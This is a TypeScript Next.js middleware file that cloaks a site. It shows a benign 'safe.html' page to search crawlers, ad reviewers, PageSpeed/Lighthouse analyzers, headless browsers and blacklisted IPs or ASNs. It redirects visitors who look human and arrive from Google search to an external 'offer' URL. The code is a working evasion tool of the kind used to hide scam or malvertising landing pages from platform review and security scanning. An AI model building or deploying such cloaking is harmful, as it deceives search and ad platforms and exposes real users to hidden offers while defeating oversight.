import { NextRequest, NextResponse, userAgent } from 'next/server'
import {
  computeScore,
  getIP,
  hasHumanActivity,
  isBanned,
  isBlacklistedASN,
  isBlacklistedIP,
  isBlockedUserAgent,
  isStaticAssetPath,
  reversePTRMatches,
  fingerprintValid,
  getASN,
  isAnalyzerRequest,
  isLikelyBrowserAutomation,
  isTrustedGoogleRef,
} from './utils/botCheck'

async function logDecision(req: NextRequest, decision: 'offer' | 'safe' | 'challenge' | 'bypass', reasons: string[], score?: number) {
  try {
    const origin = req.nextUrl.origin
    const payload = {
      ts: Date.now(),
      path: req.nextUrl.pathname,
      ip: getIP(req),
      ua: req.headers.get('user-agent') || '',
      asn: getASN(req),
      country: (req as any)?.cf?.country || req.geo?.country || req.headers.get('cf-ipcountry') || null,
      decision,
      reasons,
      score: score ?? null,
    }
    // Fire-and-forget; don't block middleware
    fetch(`${origin}/api/logs`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(payload),
      // keepalive hints the platform to allow it after response
      keepalive: true as any,
    }).catch(() => {})
  } catch {
    // ignore logging errors
  }
}

export async function middleware(req: NextRequest) {
  const { pathname } = req.nextUrl

  // Activation gate: if NEXT_PUBLIC_OFFER_URL is not set, always serve safe.html
  const OFFER_URL_ENV = process.env.NEXT_PUBLIC_OFFER_URL
  if (!OFFER_URL_ENV) {
    // Allow assets, _next, api, and safe.html itself
    if (
      pathname.startsWith('/_next') ||
      pathname.startsWith('/api/') ||
      pathname === '/safe.html' ||
      isStaticAssetPath(pathname)
    ) {
      await logDecision(req, 'bypass', ['inactive:env-missing'])
      return NextResponse.next()
    }
    await logDecision(req, 'safe', ['inactive:env-missing'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // Allow these paths to pass through without cloaking
  if (
    pathname.startsWith('/_next') ||
    pathname.startsWith('/api/') ||
    pathname === '/hc' ||
    pathname === '/safe.html' ||
    pathname === '/offer.html' ||
    isStaticAssetPath(pathname)
  ) {
    await logDecision(req, 'bypass', ['matcher:excluded'])
    return NextResponse.next()
  }

  // Allowlist: real browser traffic coming from Google search results
  if (isTrustedGoogleRef(req)) {
    await logDecision(req, 'offer', ['allow:google-ref'])
    const OFFER_URL = process.env.NEXT_PUBLIC_OFFER_URL
    if (OFFER_URL && /^https?:\/\//i.test(OFFER_URL)) {
      return NextResponse.redirect(OFFER_URL)
    }
    return NextResponse.rewrite(new URL('/offer.html', req.url))
  }

  // Hard bans (skip for Google-ref allowlisted traffic)
  if (isBanned(req)) {
    await logDecision(req, 'safe', ['cookie:ban'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  const uaStr = req.headers.get('user-agent')
  const { isBot: uaBot } = (() => {
    const r = isBlockedUserAgent(uaStr)
    return { isBot: r.blocked }
  })()
  if (uaBot) {
    await logDecision(req, 'safe', ['ua:blocklist'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // Block common performance analyzers (PageSpeed/Lighthouse/etc.)
  if (isAnalyzerRequest(req)) {
    await logDecision(req, 'safe', ['analyzer:detected'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // Block likely browser automation even with generic UA
  const auto = isLikelyBrowserAutomation(req)
  if (auto.flag) {
    await logDecision(req, 'safe', ['automation:suspect', ...auto.reasons])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  const ip = getIP(req)
  if (isBlacklistedIP(ip)) {
    await logDecision(req, 'safe', ['ip:blacklist'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  const asn = getASN(req)
  if (isBlacklistedASN(asn as any)) {
    await logDecision(req, 'safe', ['asn:blacklist'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // Reverse DNS PTR for known crawler domains
  const isPtrBot = await reversePTRMatches(ip, [
    /\.googlebot\.com\.?$/i,
    /\.search\.msn\.com\.?$/i,
    /\.crawl\.yahoo\.net\.?$/i,
    /\.baidu\.com\.?$/i,
    /\.yandex\.ru\.?$/i,
    /\.facebook\.com\.?$/i,
  ])
  if (isPtrBot) {
    await logDecision(req, 'safe', ['ptr:bot'])
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // No visible challenge: proceed to scoring based on passive signals

  // ML-lite scoring
  const { score, factors } = computeScore(req)
  const threshold = 50
  if (score < threshold) {
    await logDecision(req, 'safe', ['ml:low', `score:${score}`, ...factors], score)
    return NextResponse.rewrite(new URL('/safe.html', req.url))
  }

  // Passed: send to offer immediately
  await logDecision(req, 'offer', ['ml:pass', `score:${score}`, ...factors], score)
  const OFFER_URL = process.env.NEXT_PUBLIC_OFFER_URL
  if (OFFER_URL && /^https?:\/\//i.test(OFFER_URL)) {
    return NextResponse.redirect(OFFER_URL)
  }
  return NextResponse.rewrite(new URL('/offer.html', req.url))
}

export const config = {
  matcher: ['/((?!_next|api|.*\\.(?:png|jpg|jpeg|gif|svg|ico|css|js|map|txt|webp|woff2?|ttf|eot)).*)'],
}
